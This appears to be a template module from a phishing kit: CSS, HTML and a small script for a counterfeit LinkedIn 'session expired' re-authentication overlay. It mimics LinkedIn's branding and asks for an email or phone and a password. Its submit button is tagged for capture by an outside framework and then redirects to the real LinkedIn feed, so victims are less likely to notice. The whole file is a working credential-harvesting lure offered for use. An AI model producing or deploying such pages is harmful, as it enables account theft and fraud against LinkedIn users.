// LinkedIn "session expired" re-auth overlay. Modern (2025/26) sign-in styling.
// Brand mark inlined as SVG so it renders with zero external requests.
module.exports = {
  id: 'linkedin',
  label: 'LinkedIn',
  blurb: 'LinkedIn session-expired re-auth dialog',

  css: `
  .li-card{width:380px;max-width:100%;background:#fff;border-radius:12px;
    box-shadow:0 4px 24px rgba(0,0,0,.22);padding:24px 24px 20px;color:rgba(0,0,0,.9)}
  .li-logo{color:#0a66c2;font-size:30px;font-weight:700;letter-spacing:-1px;margin-bottom:12px}
  .li-logo b{background:#0a66c2;color:#fff;border-radius:4px;padding:0 4px;margin-left:1px}
  .li-h1{font-size:22px;font-weight:600;margin:0 0 2px}
  .li-sub{font-size:14px;color:rgba(0,0,0,.6);margin:0 0 18px}
  .li-field{position:relative;margin-bottom:16px}
  .li-field label{position:absolute;top:15px;left:12px;font-size:14px;color:rgba(0,0,0,.6);
    pointer-events:none;transition:.12s ease;background:#fff;padding:0 2px}
  .li-field input{width:100%;height:52px;padding:18px 12px 4px;font-size:16px;
    border:1px solid rgba(0,0,0,.55);border-radius:6px;outline:none;color:rgba(0,0,0,.9);background:#fff}
  .li-field input:focus{border:2px solid #0a66c2;padding:17px 11px 3px}
  .li-field input:focus + label,
  .li-field.filled label{top:6px;font-size:11px;color:rgba(0,0,0,.6)}
  .li-show{position:absolute;right:8px;top:14px;font-size:14px;font-weight:600;
    color:#0a66c2;cursor:pointer;background:#fff;border:none;padding:6px 8px;border-radius:18px}
  .li-show:hover{background:#eaf3fc}
  .li-forgot{display:inline-block;font-size:14px;font-weight:600;color:#0a66c2;
    text-decoration:none;margin:0 0 16px}
  .li-btn{width:100%;height:48px;border:none;border-radius:28px;background:#0a66c2;
    color:#fff;font-size:16px;font-weight:600;cursor:pointer}
  .li-btn:hover{background:#004182}
  .li-or{display:flex;align-items:center;gap:12px;margin:16px 0;color:rgba(0,0,0,.6);font-size:14px}
  .li-or::before,.li-or::after{content:"";flex:1;height:1px;background:rgba(0,0,0,.2)}
  .li-google{width:100%;height:48px;border:1px solid rgba(0,0,0,.6);border-radius:28px;
    background:#fff;color:rgba(0,0,0,.75);font-size:15px;font-weight:500;cursor:pointer;
    display:flex;align-items:center;justify-content:center;gap:10px}
  .li-google:hover{background:#f3f9ff;border-color:#0a66c2}
  .li-google svg{height:18px;width:18px}
  .li-join{text-align:center;font-size:15px;color:rgba(0,0,0,.9);margin-top:20px}
  .li-join a{color:#0a66c2;font-weight:600;text-decoration:none}
  `,

  html: `
  <div class="li-card" data-wr-card>
    <div class="li-logo">Linked<b>in</b></div>
    <div class="li-h1">Sign in</div>
    <div class="li-sub">Your session has expired. Please sign in again to continue.</div>

    <div class="li-field">
      <input id="li-user" name="username" type="text" autocomplete="username" />
      <label for="li-user">Email or phone</label>
    </div>

    <div class="li-field">
      <input id="li-pass" name="password" type="password" autocomplete="current-password" />
      <label for="li-pass">Password</label>
      <button type="button" class="li-show" data-wr-toggle>show</button>
    </div>

    <a class="li-forgot" href="#" onclick="return false">Forgot password?</a>

    <button class="li-btn" data-wr-submit data-wr-redirect="https://www.linkedin.com/feed/">Sign in</button>

    <div class="li-or">or</div>

    <button type="button" class="li-google">
      <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9 3.6l6.7-6.7C35.6 2.4 30.1 0 24 0 14.6 0 6.4 5.4 2.5 13.3l7.8 6.1C12.2 13.7 17.6 9.5 24 9.5z"/><path fill="#4285F4" d="M46.1 24.6c0-1.6-.1-3.1-.4-4.6H24v9.3h12.4c-.5 2.9-2.1 5.3-4.6 7l7.1 5.5c4.2-3.9 6.6-9.6 6.6-17.2z"/><path fill="#FBBC05" d="M10.3 28.6c-.5-1.4-.8-2.9-.8-4.6s.3-3.2.8-4.6l-7.8-6.1C.9 16.4 0 20.1 0 24s.9 7.6 2.5 10.7l7.8-6.1z"/><path fill="#34A853" d="M24 48c6.1 0 11.3-2 15-5.4l-7.1-5.5c-2 1.3-4.6 2.1-7.9 2.1-6.4 0-11.8-4.2-13.7-9.9l-7.8 6.1C6.4 42.6 14.6 48 24 48z"/></svg>
      Continue with Google
    </button>

    <div class="li-join">New to LinkedIn? <a href="#" onclick="return false">Join now</a></div>
  </div>
  `,

  script: `
    // float-label state + password show/hide, scoped to this overlay
    root.querySelectorAll('.li-field input').forEach(function(inp){
      var f=inp.closest('.li-field');
      var sync=function(){ f.classList.toggle('filled', !!inp.value); };
      inp.addEventListener('input',sync); inp.addEventListener('blur',sync);
    });
    var pass=root.getElementById('li-pass');
    var tog=root.querySelector('[data-wr-toggle]');
    if(tog) tog.addEventListener('click',function(){
      var show=pass.type==='password'; pass.type=show?'text':'password';
      tog.textContent=show?'hide':'show';
    });
    setTimeout(function(){ var u=root.getElementById('li-user'); if(u) u.focus(); },50);
  `
};
